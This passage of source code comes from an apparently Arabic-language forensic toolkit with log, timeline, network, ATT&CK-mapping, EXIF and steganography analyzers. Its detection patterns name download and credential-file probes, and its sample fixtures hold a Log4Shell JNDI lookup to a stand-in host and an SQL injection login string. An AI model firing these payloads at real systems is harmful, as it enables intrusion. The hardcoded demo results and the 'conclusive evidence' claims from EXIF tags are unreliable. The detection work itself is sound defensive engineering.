      stats.bySeverity[hasMal ? "CRITICAL" : pat.sev]++;
    }
    let score = 0;
    score += (stats.bySeverity.CRITICAL || 0) * 10;
    score += (stats.bySeverity.HIGH || 0) * 5;
    score += (stats.bySeverity.MEDIUM || 0) * 2;
    score += (stats.bySeverity.LOW || 0) * 1;
    const pct = Math.min(Math.round((score / 80) * 100), 99);
    const threat = pct >= 65 ? "crit" : pct >= 30 ? "warn" : "safe";
    return { results, stats, pct, threat, extracted };
  }

  const SAMPLE = `[2024-04-10 08:14:22] Connection from 185.220.101.47 to 192.168.1.100\nPOST /upload HTTP/1.1 Host: evil-domain.xyz\nMalware Hash: a3f9b2c1d8e5f7a0b2c4d6e8f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9\nBitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\nCVE-2024-1234 exploitation detected\nRegistry: HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware\nPowerShell: powershell.exe -enc SGVsbG8gV29ybGQ=`;
  return { analyze, SAMPLE };
})();

// ═══════════════════════════════════════════════════
// MOD-08 — DIGITAL TIMELINE RECONSTRUCTOR
// ═══════════════════════════════════════════════════
export const TimelineEngine = (() => {
  const TS_PATTERNS = [
    {
      id: "iso8601",
      fmt: "ISO 8601",
      regex: /\b(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?)/g,
    },
    {
      id: "syslog",
      fmt: "Syslog",
      regex:
        /\b((?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})/g,
    },
    {
      id: "apache",
      fmt: "Apache Log",
      regex:
        /\[(\d{2}\/(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\/\d{4}:\d{2}:\d{2}:\d{2}\s[+-]\d{4})\]/g,
    },
    { id: "epoch", fmt: "Unix Epoch", regex: /\b(1[3-9]\d{8}|[2-9]\d{9})\b/g },
    { id: "exif", fmt: "EXIF TS", regex: /\b(\d{4}:\d{2}:\d{2}\s\d{2}:\d{2}:\d{2})\b/g },
  ];
  const MONTH_MAP = {
    Jan: 0,
    Feb: 1,
    Mar: 2,
    Apr: 3,
    May: 4,
    Jun: 5,
    Jul: 6,
    Aug: 7,
    Sep: 8,
    Oct: 9,
    Nov: 10,
    Dec: 11,
  };
  function parseTimestamp(str, id) {
    try {
      if (id === "epoch") return new Date(parseInt(str) * 1000);
      if (id === "exif") return new Date(str.replace(/^(\d{4}):(\d{2}):(\d{2})/, "$1-$2-$3"));
      if (id === "syslog") {
        const [m, d, ...time] = str.split(/\s+/);
        return new Date(
          `${new Date().getFullYear()}-${String(MONTH_MAP[m] + 1).padStart(2, "0")}-${d.padStart(2, "0")} ${time.join(" ")}`,
        );
      }
      if (id === "apache") {
        const m = str.match(
          /(\d{2})\/(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\/(\d{4}):(\d{2}:\d{2}:\d{2})/,
        );
        if (m)
          return new Date(
            `${m[3]}-${String(MONTH_MAP[m[2]] + 1).padStart(2, "0")}-${m[1]} ${m[4]}`,
          );
      }
      return new Date(str);
    } catch {
      return null;
    }
  }
  function detectAnomalies(events) {
    const anomalies = [];
    const sorted = [...events].sort((a, b) => a.ts - b.ts);
    for (let i = 1; i < sorted.length; i++) {
      const gap = sorted[i].ts - sorted[i - 1].ts;
      if (gap / 3600000 > 12)
        anomalies.push({
          type: "gap",
          gapH: (gap / 3600000).toFixed(1),
          events: [sorted[i - 1], sorted[i]],
        });
    }
    const now = Date.now();
    sorted.filter((e) => e.ts > now).forEach((e) => anomalies.push({ type: "future", event: e }));
    sorted
      .filter((e) => {
        const h = new Date(e.ts).getHours();
        return h >= 0 && h < 5;
      })
      .forEach((e) =>
        anomalies.push({ type: "offhours", event: e, hour: new Date(e.ts).getHours() }),
      );
    return anomalies;
  }
  function analyze(text) {
    const events = [];
    const seen = new Set();
    for (const pat of TS_PATTERNS) {
      const regex = new RegExp(pat.regex.source, pat.regex.flags);
      let m;
      while ((m = regex.exec(text)) !== null) {
        const raw = m[1];
        if (seen.has(raw)) continue;
        seen.add(raw);
        const dt = parseTimestamp(raw, pat.id);
        if (dt && !isNaN(dt.getTime())) {
          const context = text
            .slice(Math.max(0, m.index - 40), m.index + raw.length + 40)
            .replace(/\n/g, " ")
            .trim()
            .slice(0, 100);
          events.push({ raw, ts: dt.getTime(), date: dt, fmt: pat.fmt, context });
        }
      }
    }
    const sorted = [...events].sort((a, b) => a.ts - b.ts);
    const anomalies = detectAnomalies(sorted);
    const span = sorted.length >= 2 ? sorted[sorted.length - 1].ts - sorted[0].ts : 0;
    const pct = Math.min(anomalies.length * 15, 99);
    const threat = pct >= 60 ? "crit" : pct >= 25 ? "warn" : "safe";
    return {
      events: sorted,
      anomalies,
      total: sorted.length,
      span: (span / 3600000).toFixed(1),
      earliest: sorted[0]?.date,
      latest: sorted[sorted.length - 1]?.date,
      pct,
      threat,
    };
  }
  const SAMPLE = `[2024-04-10 02:14:22] System boot from USB\n[2024-04-10 02:15:01] User admin login SUCCESS — IP: 185.220.101.47\n[2024-04-10 02:15:03] File access: C:\\Users\\admin\\Documents\\financial_2024.xlsx\n[2024-04-10 02:19:30] Network connection to 185.220.101.47:4444\n[2024-04-10 02:19:35] Data transfer: 2.4GB uploaded\n\n[2024-04-10 16:33:12] Antivirus disabled\n[2024-04-10 16:34:01] powershell.exe -enc SGVsbG8gV29ybGQ=\n2024-04-10T23:59:59Z Final exfiltration complete`;
  return { analyze, SAMPLE };
})();

// ═══════════════════════════════════════════════════
// MOD-09 — NETWORK LOG ANALYZER
// ═══════════════════════════════════════════════════
export const NetLogEngine = (() => {
  const EXPLOIT_PATHS = [
    /\/(?:admin|wp-admin|phpmyadmin|manager|administrator|console|cpanel)\//i,
    /\.(?:php|asp|aspx|jsp|cgi)\?.*(?:cmd|exec|system|shell|eval|base64)/i,
    /(?:\.\.\/){2,}|%2e%2e%2f/i,
    /(?:union\s+select|1=1|or\s+1=1|drop\s+table)/i,
    /(?:<script|javascript:|onerror=|onload=)/i,
    /(?:\/etc\/passwd|\/proc\/self\/environ)/i,
    /(?:cmd\.exe|powershell|wget\s+http|curl\s+http)/i,
    /(?:JNDI:|log4j|Log4Shell|\$\{jndi:)/i,
    /(?:\.git\/|\.env\b|\.htaccess)/i,
  ];
  const SCANNER_UA = [
    /(?:sqlmap|nikto|nmap|masscan|dirbuster|gobuster|hydra)/i,
    /(?:python-requests|curl\/[0-9]|wget\/[0-9]|go-http-client)/i,
    /(?:zgrab|nessus|openvas|nuclei|wfuzz)/i,
  ];
  const APACHE_RE =
    /^(\S+)\s+\S+\s+\S+\s+\[([^\]]+)\]\s+"([A-Z]+)\s+([^\s]+)\s+([^"]+)"\s+(\d+)\s+(\d+)(?:\s+"([^"]*)"\s+"([^"]*)")?/;
  function parseLine(line) {
    let m = line.match(APACHE_RE);
    if (m)
      return {
        ip: m[1],
        ts: m[2],
        method: m[3],
        path: m[4],
        status: parseInt(m[6]),
        bytes: parseInt(m[7]),
        ua: m[9] || "",
        format: "apache",
      };
    const ipM = line.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
    if (ipM) return { ip: ipM[1], status: 0, raw: line, format: "generic" };
    return null;
  }
  function analyze(rawLog) {
    const lines = rawLog.split("\n").filter((l) => l.trim().length > 5);
    const parsed = lines.map(parseLine).filter(Boolean);
    const ipMap = {};
    const uaMap = {};
    const statusMap = { 2: 0, 3: 0, 4: 0, 5: 0 };
    let totalReq = 0,
      totalBytes = 0;
    for (const r of parsed) {
      if (r.ip) ipMap[r.ip] = (ipMap[r.ip] || 0) + 1;
      if (r.ua) uaMap[r.ua] = (uaMap[r.ua] || 0) + 1;
      if (r.status)
        statusMap[Math.floor(r.status / 100)] = (statusMap[Math.floor(r.status / 100)] || 0) + 1;
      if (r.bytes) totalBytes += r.bytes;
      totalReq++;
    }
    const topIPs = Object.entries(ipMap)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 10);
    const findings = [];
    let score = 0;
    const bruteIPs = topIPs.filter(([, c]) => c > 50);
    if (bruteIPs.length) {
      score += 20;
      findings.push({
        sev: "CRITICAL",
        rule: `Brute Force من ${bruteIPs.length} IP`,
        det: `أعلى: ${bruteIPs
          .slice(0, 3)
          .map(([ip, c]) => `${ip}(${c})`)
          .join(" · ")}`,
        ev: bruteIPs[0]?.[0],
      });
    }
    const scanners = Object.keys(uaMap).filter((ua) => SCANNER_UA.some((r) => r.test(ua)));
    if (scanners.length) {
      score += 25;
      findings.push({
        sev: "CRITICAL",
        rule: `كشف ماسح أمني (${scanners.length})`,
        det: `Tools: ${scanners.slice(0, 3).join(", ")}`,
        ev: scanners[0],
      });
    }
    const exploitLines = parsed.filter((r) => r.path && EXPLOIT_PATHS.some((p) => p.test(r.path)));
    if (exploitLines.length) {
      score += 30;
      findings.push({
        sev: "CRITICAL",
        rule: `محاولات استغلال ثغرات (${exploitLines.length})`,
        det: "SQLi · XSS · Path Traversal · RCE · Log4Shell",
        ev: exploitLines[0]?.path,
      });
    }
    const errRate = (statusMap[4] || 0) / (totalReq || 1);
    if (errRate > 0.4) {
      score += 15;
      findings.push({
        sev: "HIGH",
        rule: "معدل 4xx عالٍ — Directory Scanning",
        det: `${(errRate * 100).toFixed(1)}% أخطاء`,
        ev: `${statusMap[4]}/${totalReq}`,
      });
    }
    const pct = Math.min(Math.round((score / 100) * 100), 99);
    const threat = pct >= 60 ? "crit" : pct >= 30 ? "warn" : "safe";
    return {
      pct,
      threat,
      findings,
      stats: {
        totalReq,
        totalLines: lines.length,
        parsed: parsed.length,
        totalBytes,
        topIPs,
        statusMap,
        exploitPaths: exploitLines.length,
        scannerCount: scanners.length,
      },
    };
  }
  const SAMPLE = `185.220.101.47 - - [10/Apr/2024:02:14:22 +0000] "GET /wp-login.php HTTP/1.1" 200 2847 "-" "sqlmap/1.7.8#stable"\n185.220.101.47 - - [10/Apr/2024:02:14:23 +0000] "POST /wp-login.php HTTP/1.1" 302 0 "-" "sqlmap/1.7.8"\n45.142.212.88 - - [10/Apr/2024:02:15:05 +0000] "GET /.env HTTP/1.1" 200 843 "-" "python-requests/2.28.0"\n45.142.212.88 - - [10/Apr/2024:02:15:06 +0000] "POST /api/login?username=admin'OR'1'='1 HTTP/1.1" 500 0 "-" "python-requests/2.28.0"\n91.108.4.155  - - [10/Apr/2024:02:16:00 +0000] "GET / HTTP/1.1" 200 1024 "-" "zgrab/0.x"`;
  return { analyze, SAMPLE };
})();

// ═══════════════════════════════════════════════════
// MOD-10 — MITRE ATT&CK MAPPER
// ═══════════════════════════════════════════════════
export const ATTACKEngine = (() => {
  const TECHNIQUES = {
    T1566: { name: "Phishing", tactic: "TA0001", desc: "رسائل بريد إلكتروني مزيفة" },
    "T1566.001": { name: "Spearphishing Attachment", tactic: "TA0001", desc: "ملفات مرفقة خبيثة" },
    "T1566.002": { name: "Spearphishing Link", tactic: "TA0001", desc: "روابط خبيثة موجهة" },
    T1190: { name: "Exploit Public-Facing App", tactic: "TA0001", desc: "استغلال ثغرات التطبيقات" },
    T1078: { name: "Valid Accounts", tactic: "TA0001", desc: "استخدام حسابات مسروقة" },
    T1059: {
      name: "Command & Scripting Interpreter",
      tactic: "TA0002",
      desc: "PowerShell/CMD/Bash",
    },
    "T1059.001": { name: "PowerShell", tactic: "TA0002", desc: "كود خبيث عبر PowerShell" },
    T1027: {
      name: "Obfuscated Files/Information",
      tactic: "TA0005",
      desc: "ترميز Base64 للكود الخبيث",
    },
    "T1547.001": { name: "Registry Run Keys", tactic: "TA0003", desc: "Persistence عبر Registry" },
    T1071: {
      name: "Application Layer Protocol",
      tactic: "TA0011",
      desc: "اتصال C2 عبر HTTP/HTTPS",
    },
    T1041: { name: "Exfiltration Over C2", tactic: "TA0010", desc: "تسريب البيانات" },
    T1486: {
      name: "Data Encrypted for Impact",
      tactic: "TA0040",
      desc: "تشفير البيانات (Ransomware)",
    },
    T1657: { name: "Financial Theft", tactic: "TA0040", desc: "سرقة مالية أو فدية" },
    T1110: { name: "Brute Force", tactic: "TA0006", desc: "محاولات اختراق كلمة المرور" },
    T1046: { name: "Network Service Discovery", tactic: "TA0007", desc: "مسح خدمات الشبكة" },
    T1552: {
      name: "Unsecured Credentials",
      tactic: "TA0006",
      desc: "الوصول لبيانات اعتماد غير محمية",
    },
    T1560: {
      name: "Archive Collected Data",
      tactic: "TA0009",
      desc: "تأرشفة البيانات قبل التسريب",
    },
  };
  const TACTICS = {
    TA0043: { name: "Reconnaissance", color: "#8b5cf6", ar: "الاستطلاع" },
    TA0001: { name: "Initial Access", color: "#ef4444", ar: "الوصول الأولي" },
    TA0002: { name: "Execution", color: "#f43f5e", ar: "التنفيذ" },
    TA0003: { name: "Persistence", color: "#f59e0b", ar: "الثبات" },
    TA0005: { name: "Defense Evasion", color: "#84cc16", ar: "التهرب الدفاعي" },
    TA0006: { name: "Credential Access", color: "#22d3ee", ar: "الوصول للاعتمادات" },
    TA0007: { name: "Discovery", color: "#0ea5e9", ar: "الاكتشاف" },
    TA0009: { name: "Collection", color: "#ec4899", ar: "جمع البيانات" },
    TA0010: { name: "Exfiltration", color: "#14b8a6", ar: "التسريب" },
    TA0011: { name: "C2", color: "#f59e0b", ar: "التحكم والسيطرة" },
    TA0040: { name: "Impact", color: "#ef4444", ar: "الأثر والتدمير" },
  };
  const MAPPING_RULES = [
    { pattern: /phishing|تصيد|spear/i, techniques: ["T1566", "T1566.001", "T1566.002"] },
    { pattern: /bitcoin|btc|monero|ransom|فدية/i, techniques: ["T1486", "T1657"] },
    { pattern: /powershell|-enc|-nop|invoke-expression/i, techniques: ["T1059.001", "T1027"] },
    { pattern: /registry|run\s*key|hkey/i, techniques: ["T1547.001"] },
    { pattern: /base64|encoding|obfusc/i, techniques: ["T1027"] },
    { pattern: /brute\s*force|login.fail|auth.fail/i, techniques: ["T1110"] },
    { pattern: /sql\s*inject|union\s*select|sqlmap/i, techniques: ["T1190"] },
    { pattern: /path\s*traversal|\.\.\/|etc\/passwd/i, techniques: ["T1190"] },
    { pattern: /c2|command.*control|beacon/i, techniques: ["T1071", "T1041"] },
    { pattern: /exfil|تسريب|data.transfer/i, techniques: ["T1041", "T1560"] },
    { pattern: /scan|nmap|nikto|masscan|zgrab/i, techniques: ["T1046"] },
    { pattern: /credential|password|passwd|\.env/i, techniques: ["T1552"] },
    { pattern: /log4(?:shell|j)|jndi:/i, techniques: ["T1190"] },
  ];
  function analyze(text) {
    const matched = new Map();
    for (const rule of MAPPING_RULES) {
      if (rule.pattern.test(text)) {
        rule.techniques.forEach((tid) => {
          if (TECHNIQUES[tid]) {
            const ex = matched.get(tid) || { ...TECHNIQUES[tid], id: tid, confidence: 0 };
            ex.confidence = Math.min(ex.confidence + 30, 95);
            matched.set(tid, ex);
          }
        });
      }
    }
    const byTactic = {};
    for (const [tid, tech] of matched) {
      const ta = tech.tactic;
      if (!byTactic[ta]) byTactic[ta] = { ...TACTICS[ta], id: ta, techniques: [] };
      byTactic[ta].techniques.push({ id: tid, ...tech });
    }
    const tacticOrder = [
      "TA0043",
      "TA0001",
      "TA0002",
      "TA0003",
      "TA0004",
      "TA0005",
      "TA0006",
      "TA0007",
      "TA0008",
      "TA0009",
      "TA0010",
      "TA0011",
      "TA0040",
    ];
    const activeTactics = tacticOrder.filter((t) => byTactic[t]);
    const killChainStage =
      activeTactics.length > 0 ? tacticOrder.indexOf(activeTactics[activeTactics.length - 1]) : 0;
    const pct = Math.min(matched.size * 12, 99);
    const threat = pct >= 60 ? "crit" : pct >= 25 ? "warn" : "safe";
    return {
      techniques: [...matched.values()],
      byTactic,
      total: matched.size,
      tacticCount: Object.keys(byTactic).length,
      killChainStage,
      TACTICS,
      activeTactics,
      pct,
      threat,
    };
  }
  const SAMPLE_TEXT = `Phishing email with bitcoin payment and base64 encoded PowerShell payload.\nRegistry persistence via Run key. Data exfiltration via C2. Brute force login. SQL injection. Log4Shell: \${jndi:ldap://evil.xyz/a}`;
  return { analyze, TECHNIQUES, TACTICS, SAMPLE_TEXT };
})();

/* ═══════════════════════════════════════════════════════
   MOD-03 — IMAGE FORENSICS ENGINE (Canvas + EXIF)
   محرك الطب الشرعي للصور
═══════════════════════════════════════════════════════ */
export const ImageEngine = (() => {
  const EXIF_TAG: Record<number, string> = {
    0x010f: "Make",
    0x0110: "Model",
    0x0112: "Orientation",
    0x011a: "XResolution",
    0x011b: "YResolution",
    0x0128: "ResolutionUnit",
    0x0131: "Software",
    0x0132: "DateTime",
    0x013b: "Artist",
    0x8298: "Copyright",
    0x0100: "ImageWidth",
    0x0101: "ImageLength",
    0x8769: "ExifIFDPointer",
    0x8825: "GPSInfoIFDPointer",
    0x829a: "ExposureTime",
    0x829d: "FNumber",
    0x8822: "ExposureProgram",
    0x8827: "ISOSpeedRatings",
    0x9000: "ExifVersion",
    0x9003: "DateTimeOriginal",
    0x9004: "DateTimeDigitized",
    0x9201: "ShutterSpeedValue",
    0x9202: "ApertureValue",
    0x9204: "ExposureBiasValue",
    0x9207: "MeteringMode",
    0x9209: "Flash",
    0x920a: "FocalLength",
    0x927c: "MakerNote",
    0xa000: "FlashPixVersion",
    0xa001: "ColorSpace",
    0xa002: "PixelXDimension",
    0xa003: "PixelYDimension",
    0xa402: "ExposureMode",
    0xa403: "WhiteBalance",
    0xa405: "FocalLengthIn35mmFilm",
    0xa420: "ImageUniqueID",
    0xa431: "BodySerialNumber",
    0xa434: "LensModel",
    0x0213: "YCbCrPositioning",
  };
  const GPS_TAG: Record<number, string> = {
    0x0001: "GPSLatitudeRef",
    0x0002: "GPSLatitude",
    0x0003: "GPSLongitudeRef",
    0x0004: "GPSLongitude",
    0x0005: "GPSAltitudeRef",
    0x0006: "GPSAltitude",
    0x0007: "GPSTimeStamp",
    0x0009: "GPSStatus",
    0x000b: "GPSDOP",
    0x000d: "GPSSpeed",
    0x000f: "GPSTrack",
    0x0011: "GPSImgDirection",
    0x001d: "GPSDateStamp",
    0x001f: "GPSHPositioningError",
  };
  function readStr(v: DataView, o: number, n: number) {
    let s = "";
    for (let i = 0; i < n; i++) {
      const c = v.getUint8(o + i);
      if (!c) break;
      s += String.fromCharCode(c);
    }
    return s.trim();
  }
  function rational(v: DataView, o: number, le: boolean) {
    const n = v.getUint32(o, le),
      d = v.getUint32(o + 4, le);
    return d ? n / d : 0;
  }
  function readIFD(
    v: DataView,
    ifdOff: number,
    le: boolean,
    tagDict: Record<number, string>,
  ): Record<string, any> {
    const out: Record<string, any> = {};
    if (ifdOff + 2 > v.byteLength) return out;
    const n = v.getUint16(ifdOff, le);
    let p = ifdOff + 2;
    for (let i = 0; i < n && p + 12 <= v.byteLength; i++, p += 12) {
      const tag = v.getUint16(p, le),
        type = v.getUint16(p + 2, le),
        cnt = v.getUint32(p + 4, le),
        vp = p + 8;
      let val = null;
      try {
        if (type === 2) {
          val = cnt <= 4 ? readStr(v, vp, cnt) : readStr(v, v.getUint32(vp, le), cnt);
        } else if (type === 3) {
          val = cnt === 1 ? v.getUint16(vp, le) : [v.getUint16(vp, le), v.getUint16(vp + 2, le)];
        } else if (type === 4) {
          val = v.getUint32(vp, le);
        } else if (type === 5) {
          const off = v.getUint32(vp, le);
          val = cnt === 1 ? rational(v, off, le) : [rational(v, off, le), rational(v, off + 8, le)];
        }
      } catch (_) {
        val = null;
      }
      out[tagDict[tag] || `0x${tag.toString(16).toUpperCase()}`] = val;
    }
    return out;
  }
  function jpegQuality(arr: Uint8Array): number | null {
    for (let i = 0; i < arr.length - 1; i++) {
      if (arr[i] === 0xff && arr[i + 1] === 0xdb) {
        const tbl = Array.from(arr.slice(i + 5, i + 69));
        if (tbl.length < 64) continue;
        const avg = tbl.reduce((a, v) => a + v, 0) / 64;
        return Math.max(1, Math.min(100, Math.round(101 - avg * 1.42)));
      }
    }
    return null;
  }
  function editorSigs(arr: Uint8Array): { label: string; sev: string }[] {
    const s = Array.from(arr.slice(0, 8192))
      .map((b) => String.fromCharCode(b))
      .join("")
      .toLowerCase();
    return [
      ["photoshop", "Adobe Photoshop", "CRITICAL"],
      ["gimp", "GIMP", "HIGH"],
      ["lightroom", "Adobe Lightroom", "HIGH"],
      ["facetune", "Facetune", "CRITICAL"],
      ["faceapp", "FaceApp", "CRITICAL"],
      ["canva", "Canva", "HIGH"],
      ["snapseed", "Snapseed", "HIGH"],
      ["meitu", "Meitu", "HIGH"],
      ["midjourney", "AI Generator (MidJourney)", "CRITICAL"],
      ["stable diffusion", "AI Generator (Stable Diffusion)", "CRITICAL"],
    ]
      .filter(([k]) => s.includes(k as string))
      .map(([, label, sev]) => ({ label: label as string, sev: sev as string }));
  }
  function gpsDecimal(arr: number[] | null, ref: string | null): number | null {
    if (!Array.isArray(arr) || arr.length < 3) return null;
    const dec = arr[0] + arr[1] / 60 + arr[2] / 3600;
    return ref === "S" || ref === "W" ? -dec : dec;
  }
  async function analyze(file: File): Promise<any> {
    if (!file) return analyzeDemo();
    return new Promise((resolve) => {
      const fr = new FileReader();
      fr.onload = (e) => {
        const arr = new Uint8Array((e.target as any).result);
        const view = new DataView(arr.buffer);
        const magic =
          arr[0] === 0xff && arr[1] === 0xd8
            ? "JPEG"
            : arr[0] === 0x89 && arr[1] === 0x50
              ? "PNG"
              : "UNKNOWN";
        const meta: any = {
          name: file.name,
          size: file.size,
          type: file.type || magic,
          magic,
          lastModified: file.lastModified,
          tags: {},
          gps: null,
          editorSigs: editorSigs(arr),
          jpegQuality: jpegQuality(arr),
          hasThumbnail: false,
        };
        if (magic === "JPEG") {
          let pos = 2;
          while (pos < arr.length - 4) {
            if (arr[pos] !== 0xff) {
              pos++;
              continue;
            }
            const mkr = arr[pos + 1],
              len = (arr[pos + 2] << 8) | arr[pos + 3];
            if (mkr === 0xe1 && len > 6 && readStr(view, pos + 4, 4) === "Exif") {
              const tb = pos + 10;
              const tView = new DataView(arr.buffer, tb);
              const le = arr[tb] === 0x49;
              const ifd0Off = tView.getUint32(4, le);
              const ifd0 = readIFD(tView, ifd0Off, le, EXIF_TAG);
              Object.assign(meta.tags, ifd0);
              if (ifd0["ExifIFDPointer"] != null)
                Object.assign(meta.tags, readIFD(tView, ifd0["ExifIFDPointer"], le, EXIF_TAG));
              if (ifd0["GPSInfoIFDPointer"] != null) {
                const g = readIFD(tView, ifd0["GPSInfoIFDPointer"], le, GPS_TAG);
                const lat = gpsDecimal(g["GPSLatitude"], g["GPSLatitudeRef"]);
                const lon = gpsDecimal(g["GPSLongitude"], g["GPSLongitudeRef"]);
                if (lat !== null && lon !== null)
                  meta.gps = { lat: lat.toFixed(6), lon: lon.toFixed(6) };
              }
              break;
            }
            pos += 2 + (mkr === 0xd9 || mkr === 0xd8 ? 0 : len);
          }
        }
        // Build indicators
        const t = meta.tags,
          inds: any[] = [];
        let score = 0;
        const sw = (t.Software || "").toLowerCase();
        const editors = [
          "photoshop",
          "gimp",
          "lightroom",
          "snapseed",
          "facetune",
          "faceapp",
          "canva",
          "affinity",
          "meitu",
        ];
        const foundEd = editors.find((n) => sw.includes(n));
        if (foundEd || meta.editorSigs.length) {
          score += 35;
          const label = foundEd ? t.Software : meta.editorSigs[0]?.label;
          inds.push({
            sev: "CRITICAL",
            rule: `بصمة تحرير مُكتشفة: ${label}`,
            det: "EXIF:Software يُثبت استخدام برنامج تحرير — دليل قاطع على التعديل الرقمي",
            ev: `EXIF:Software = "${label}"`,
          });
        }
        const dOrig = t.DateTimeOriginal || t.DateTimeDigitized,
          dMod = t.DateTime;
        if (dOrig && dMod && dOrig !== dMod) {
          const d1 = new Date(dOrig.replace(/^(\d{4}):(\d{2}):(\d{2})/, "$1-$2-$3")),
            d2 = new Date(dMod.replace(/^(\d{4}):(\d{2}):(\d{2})/, "$1-$2-$3"));
          if (!isNaN(d1.getTime())) {
            const diffH = Math.abs(d2.getTime() - d1.getTime()) / 3600000;
            if (diffH > 0.03) {
              score += 20;
              inds.push({
                sev: "HIGH",
                rule: `تعارض زمني: DateTimeOriginal ↔ DateTime (Δ ${diffH.toFixed(1)}h)`,
                det: `الالتقاط: ${dOrig} | التعديل: ${dMod}`,
                ev: `Δ=${diffH.toFixed(1)}h`,
              });
            }
          }
        }
        if (!meta.hasThumbnail && magic === "JPEG") {
          score += 12;
          inds.push({
            sev: "HIGH",
            rule: "Thumbnail EXIF غائب — مؤشر إعادة تصدير",
            det: "الكاميرات الحديثة تحفظ Thumbnail تلقائياً في IFD1",
            ev: "EXIF:IFD1:Thumbnail = NOT FOUND",
          });
        }
        if (meta.gps) {
          score += 5;
          inds.push({
            sev: "MEDIUM",
            rule: "إحداثيات GPS مُضمَّنة",
            det: "إحداثيات دقيقة قابلة للتتبع الجغرافي",
            ev: `GPS: ${meta.gps.lat}°N, ${meta.gps.lon}°E`,
          });
        }
        if (meta.jpegQuality !== null && meta.jpegQuality < 88) {
          score += 15;
          inds.push({
            sev: "MEDIUM",
            rule: `جودة JPEG منخفضة (~${meta.jpegQuality}%) — مؤشر إعادة ضغط`,
            det: "الكاميرات الحديثة تنتج JPEG بجودة 92-98%",
            ev: `JPEG Quality ≈ ${meta.jpegQuality}%`,
          });
        }
        resolve({
          pct: Math.min(score, 99),
          threat: score >= 60 ? "crit" : score >= 25 ? "warn" : "safe",
          indicators: inds,
          meta,
          magic,
        });
      };
      fr.readAsArrayBuffer(file.slice(0, 196608));
    });
  }
  function analyzeDemo() {
    return {
      pct: 82,
      threat: "crit",
      indicators: [
        {
          sev: "CRITICAL",
          rule: "بصمة تحرير Adobe Photoshop 26.0",
          det: "EXIF:Software يُثبت استخدام Photoshop مباشرةً — دليل قاطع على التعديل الرقمي",
          ev: 'EXIF:Software = "Adobe Photoshop 26.0 (Windows)"',
        },
        {
          sev: "HIGH",
          rule: "تعارض زمني: DateTimeOriginal ↔ DateTime (Δ 7.6h)",
          det: "تاريخ الالتقاط 08:14:22 يختلف عن DateTime 15:52:07",
          ev: "Original:2024:04:10 08:14:22 | Modified:2024:04:10 15:52:07",
        },
        {
          sev: "HIGH",
          rule: "Thumbnail EXIF غائب — مؤشر إعادة تصدير",
          det: "الكاميرات الحديثة تحفظ Thumbnail تلقائياً",
          ev: "EXIF:IFD1:Thumbnail = NOT FOUND",
        },
        {
          sev: "MEDIUM",
          rule: "جودة JPEG منخفضة (~82%) — مؤشر إعادة ضغط",
          det: "iPhone ينتج 94-98%. الجودة 82% تدل على إعادة الحفظ",
          ev: "JPEG Quality ≈ 82%",
        },
        {
          sev: "MEDIUM",
          rule: "إحداثيات GPS مُضمَّنة — معلومات الموقع مكشوفة",
          det: "إحداثيات GPS دقيقة تكشف موقع الالتقاط",
          ev: "GPS: 24.713600°N, 46.675300°E (الرياض، SA)",
        },
      ],
      meta: {
        name: "evidence_photo_032.jpg",
        size: 1247300,
        type: "image/jpeg",
        magic: "JPEG",
        tags: {
          Software: "Adobe Photoshop 26.0",
          DateTimeOriginal: "2024:04:10 08:14:22",
          DateTime: "2024:04:10 15:52:07",
          Make: "Apple",
          Model: "iPhone 14 Pro",
        },
        gps: { lat: "24.713600", lon: "46.675300" },
        jpegQuality: 82,
        hasThumbnail: false,
      },
    };
  }
  return { analyze, analyzeDemo };
})();

/* ═══════════════════════════════════════════════════════
   MOD-07 — STEGANOGRAPHY DETECTOR (Canvas + LSB)
   كاشف الإخفاء الرقمي
═══════════════════════════════════════════════════════ */
export const StegoEngine = (() => {
  function byteEntropy(bytes: number[]): number {
    const freq = new Map<number, number>();
    for (const b of bytes) freq.set(b, (freq.get(b) || 0) + 1);
    let e = 0;
    const n = bytes.length;
    for (const [, v] of freq) {
      const p = v / n;
      e -= p * Math.log2(p);
    }
    return e;
  }
  function chiSquare(bytes: number[]): number | null {
    const freq = new Array(256).fill(0);
    for (const b of bytes) freq[b]++;
    const expected = bytes.length / 256;
    if (expected < 5) return null;
    let chi = 0;
    for (let i = 0; i < 256; i++) chi += Math.pow(freq[i] - expected, 2) / expected;
    return chi;
  }
  function lsbAnalysis(
    pixels: Uint8ClampedArray,
    ch: number,
  ): { ratio: number; deviation: number; suspicious: boolean } {
    const lsbs: number[] = [];
    for (let i = ch; i < Math.min(pixels.length, 40000); i += 4) lsbs.push(pixels[i] & 1);
    const ones = lsbs.filter((b) => b === 1).length;
    const ratio = ones / lsbs.length;
    const deviation = Math.abs(ratio - 0.5);
    return { ratio, deviation, suspicious: deviation < 0.04 };
  }
  async function analyze(file: File): Promise<any> {
    if (!file || !file.type.startsWith("image/")) return analyzeSimulated();
    return new Promise((resolve) => {
      const url = URL.createObjectURL(file);
      const img = new Image();
      img.onload = () => {
        try {
          const canvas = document.createElement("canvas");
          canvas.width = Math.min(img.width, 800);
          canvas.height = Math.min(img.height, 600);
          const ctx = canvas.getContext("2d");
          ctx!.drawImage(img, 0, 0, canvas.width, canvas.height);
          const px = ctx!.getImageData(0, 0, canvas.width, canvas.height).data;
          const lsbR = lsbAnalysis(px, 0),
            lsbG = lsbAnalysis(px, 1),
            lsbB = lsbAnalysis(px, 2);
          const bytes = Array.from(px);
          const entropy = byteEntropy(bytes);
          const chi = chiSquare(bytes.slice(0, 10000));
          let score = 0;
          const indicators: any[] = [];
          if (lsbR.suspicious) {
            score += 25;
            indicators.push({
              sev: "HIGH",
              label: "LSB Channel R — توزيع عشوائي مشبوه",
              det: `نسبة البتات: ${(lsbR.ratio * 100).toFixed(1)}%`,
              ev: `deviation: ${lsbR.deviation.toFixed(4)}`,
            });
          }
